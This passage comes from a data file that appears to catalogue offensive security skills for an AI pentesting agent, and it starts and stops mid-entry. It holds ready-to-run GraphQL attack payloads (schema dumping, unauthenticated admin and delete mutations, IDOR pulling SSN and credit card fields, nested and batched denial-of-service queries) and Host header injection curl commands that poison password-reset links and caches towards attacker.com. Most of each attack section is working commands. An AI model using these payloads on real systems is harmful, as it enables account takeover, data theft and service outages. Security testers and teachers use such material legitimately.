&quot;Content-Type: application/json&quot; -d @-</code></pre><h4 class=\"mh\">Phase 2: Introspection Query</h4><pre class=\"code\" data-lang=bash><code># Full schema extraction\ncurl -s -X POST https://TARGET/graphql \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;query&quot;:&quot;{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }&quot;}'\n\n# Deeper extraction including type kinds and list/non-null wrappers, saved for analysis\ncurl -s -X POST https://TARGET/graphql \\\n  -H &quot;Content-Type: application/json&quot; \\\n  -d '{&quot;query&quot;:&quot;{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name } } type { name kind ofType { name } } } } } }&quot;}' | jq . &gt; schema.json\n\n# Common endpoints, if /graphql returns 404\n# /graphql, /graphiql, /v1/graphql, /api/graphql, /query</code></pre><p>If introspection is enabled, map all types, queries, mutations, and subscriptions.</p><h4 class=\"mh\">Phase 3: Authorization Bypass</h4><pre class=\"code\" data-lang=graphql><code># Access admin queries without auth\n{ adminUsers { id email role } }\n\n# Mutation without auth\nmutation { deleteUser(id: &quot;123&quot;) { success } }\n\n# Access other user's data\n{ user(id: &quot;OTHER_USER_ID&quot;) { email ssn creditCard } }</code></pre><h4 class=\"mh\">Phase 4: Complexity / DoS</h4><pre class=\"code\" data-lang=graphql><code># Deeply nested query\n{ users { posts { comments { author { posts { comments { author { id } } } } } } } }\n\n# Alias multiplication\n{ a1: __typename a2: __typename ... a100: __typename }\n\n# Batch queries (array)\n[{&quot;query&quot;:&quot;{ __typename }&quot;}, {&quot;query&quot;:&quot;{ __typename }&quot;}, ... x50]</code></pre><h4 class=\"mh\">Phase 5: Directive Abuse</h4><pre class=\"code\" data-lang=graphql><code># Skip/include directive for info leakage\n{ user(id: &quot;1&quot;) { name email @skip(if: false) secretField @include(if: true) } }\n\n# Field suggestions (error-based enum)\n{ user { nonExistentField } }\n# Error may suggest: &quot;Did you mean: password, secret_key?&quot;</code></pre>","n":2894},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Introspection enabled (schema exposed)</td><td>Medium (P3)</td></tr><tr><td>Admin mutations accessible without auth</td><td>Critical (P1)</td></tr><tr><td>Other user data accessible (IDOR)</td><td>High (P2)</td></tr><tr><td>DoS via complexity (server timeout/crash)</td><td>Medium (P3)</td></tr><tr><td>Batch queries bypass rate limiting</td><td>Medium (P3)</td></tr></tbody></table></div>","n":325},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>GraphQL endpoint URL</li><li>Query/mutation sent</li><li>Response showing unauthorized data</li><li>For introspection: schema dump (types, mutations, queries)</li><li>For DoS: response timing proving server overload</li></ul>","n":193},{"t":"Tools","h":"<ul class=\"ml\"><li>curl (introspection) plus python3 for generating nested/batched query bodies (see Phase 1), or <code>InQL</code>/<code>graphql-cop</code> if available — ask the user before installing — automated introspection + DoS + batch testing</li></ul>","n":211},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/graphql\" target=\"_blank\" rel=\"noopener\">PortSwigger: GraphQL</a></li><li><a href=\"https://www.hackerone.com/vulnerability-management/graphql-security-guide\" target=\"_blank\" rel=\"noopener\">HackerOne: GraphQL Bugs</a></li></ul>","n":173}],"m":{"name":14,"desc":277,"body":4077,"file":4534,"dband":"under","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":27.1},"name":{"lim":64,"pct":21.9}}}},"attack-host-header":{"slug":"attack-host-header","pillar":"operators","name":"attack-host-header","description":"Exploit an application's trust in the Host and X-Forwarded-Host headers — poison password-reset links towards a domain you control, confuse routing with duplicate hosts, port injection and absolute-URL request lines, and reach internal virtual hosts. Reach for it when the target builds links or routes requests from the host the client supplies.","family":"web-attack","ported":true,"source":".cyberstrike/skill/attack-host-header/SKILL.md","summary":"Exploit web server reliance on the Host header to poison password reset links, web caches, or route requests to internal services.","file":"acordia-operators/skills/attack-host-header/SKILL.md","used_by":["web-application"],"intro":"<p># Host Header Injection</p>","secs":[{"t":"Objective","h":"<p>Exploit web server reliance on the Host header to poison password reset links, web caches, or route requests to internal services.</p>","n":130},{"t":"Testing Methodology","h":"<h4 class=\"mh\">Phase 1: Password Reset Poisoning</h4><pre class=\"code\" data-lang=bash><code># Trigger password reset with injected Host\ncurl -X POST https://TARGET/forgot-password \\\n  -H &quot;Host: attacker.com&quot; \\\n  -d &quot;email=victim@example.com&quot;\n\n# X-Forwarded-Host variant\ncurl -X POST https://TARGET/forgot-password \\\n  -H &quot;X-Forwarded-Host: attacker.com&quot; \\\n  -d &quot;email=victim@example.com&quot;</code></pre><p>If the reset email link contains <code>attacker.com</code>, the token is leaked when victim clicks.</p><h4 class=\"mh\">Phase 2: Duplicate Host Headers</h4><pre class=\"code\" data-lang=bash><code># Two Host headers\ncurl https://TARGET/ \\\n  -H &quot;Host: TARGET&quot; \\\n  -H &quot;Host: attacker.com&quot;\n\n# Host with port injection\ncurl https://TARGET/ \\\n  -H &quot;Host: TARGET:@attacker.com&quot;</code></pre><h4 class=\"mh\">Phase 3: X-Forwarded-Host / X-Host</h4><pre class=\"code\" data-lang=bash><code>curl https://TARGET/ -H &quot;X-Forwarded-Host: attacker.com&quot;\ncurl https://TARGET/ -H &quot;X-Host: attacker.com&quot;\ncurl https://TARGET/ -H &quot;X-Forwarded-Server: attacker.com&quot;\ncurl https://TARGET/ -H &quot;X-Original-URL: /admin&quot;\ncurl https://TARGET/ -H &quot;X-Rewrite-URL: /admin&quot;</code></pre><h4 class=\"mh\">Phase 4: Absolute URL Routing</h4><pre class=\"code\" data-lang=bash><code># Absolute URL overrides Host header\ncurl &quot;https://TARGET/api&quot; \\\n  -H &quot;Host: internal-admin.TARGET&quot;</code></pre><h4 class=\"mh\">Phase 5: Web Cache Poisoning via Host</h4><pre class=\"code\" data-lang=bash><code># If response is cached with injected host\ncurl https://TARGET/ -H &quot;X-Forwarded-Host: attacker.com&quot; -H &quot;X-Cache: miss&quot;\n# Subsequent requests from any user will get poisoned response</code></pre>","n":1360},{"t":"What Constitutes a Finding","h":"<div class=\"tw\"><table><thead><tr><th>Finding</th><th>Severity</th></tr></thead><tbody><tr><td>Password reset link contains injected host</td><td>Critical (P1)</td></tr><tr><td>Cache poisoned with injected host/links</td><td>High (P2)</td></tr><tr><td>Internal routing bypass (access /admin)</td><td>High (P2)</td></tr><tr><td>Host header reflected in page without sanitization</td><td>Medium (P3)</td></tr></tbody></table></div>","n":289},{"t":"Evidence Requirements","h":"<ul class=\"ml\"><li>Request with injected Host header</li><li>Response/email showing injected domain</li><li>For cache poisoning: cached response serving injected content</li><li>For password reset: full reset URL with attacker domain</li></ul>","n":198},{"t":"References","h":"<ul class=\"ml\"><li><a href=\"https://portswigger.net/web-security/host-header\" target=\"_blank\" rel=\"noopener\">PortSwigger: Host Header Attacks</a></li><li><a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection\" target=\"_blank\" rel=\"noopener\">OWASP: Host Header Injection</a></li></ul>","n":284}],"m":{"name":18,"desc":346,"body":2405,"file":2939,"dband":"optimal","bband":"optimal","ceil":{"desc":{"lim":1024,"pct":33.8},"name":{"lim":64,"pct":28.1}}}},"attack-idor-automation":{"slug":"attack-idor-automation","pillar":"operators","name":"attack-idor-automation","description":"Prove broken object-level authorisation by replaying one endpoint list under two accounts and diffing the responses — sequential identifiers, UUIDs captured from an earlier reply, cookie as well as bearer sessions, HTTP method switc
